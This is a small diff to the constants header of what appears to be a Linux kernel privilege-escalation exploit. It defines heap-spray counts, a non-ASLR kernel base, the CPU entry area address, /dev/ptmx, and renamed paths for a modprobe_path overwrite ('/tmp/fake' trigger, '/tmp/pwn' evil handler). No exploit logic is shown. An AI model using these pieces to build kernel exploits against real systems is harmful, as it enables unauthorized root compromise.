@@ -37,11 +37,12 @@
 #define PIPE_NUM                    256
 #define SOCKET_NUM                  0x20
 #define NO_ASLR_BASE                0xffffffff81000000
+#define CPU_ENTRY_AREA              0xfffffe0000000000
 #define MSG_COPY                    040000
 
 #define TTY_FILE                        "/dev/ptmx"  
-#define DEFAULT_FAKE_MODPROBE_PATH      "/tmp/fake"
-#define DEFAULT_DEVIOUS_MODPROBE_PATH   "/tmp/pwned"
+#define DEFAULT_MODPROBE_TRIGGER        "/tmp/fake"
+#define DEFAULT_EVIL_MODPROBE_PATH      "/tmp/pwn"
 
 typedef unsigned long u64;
 typedef unsigned int u32;
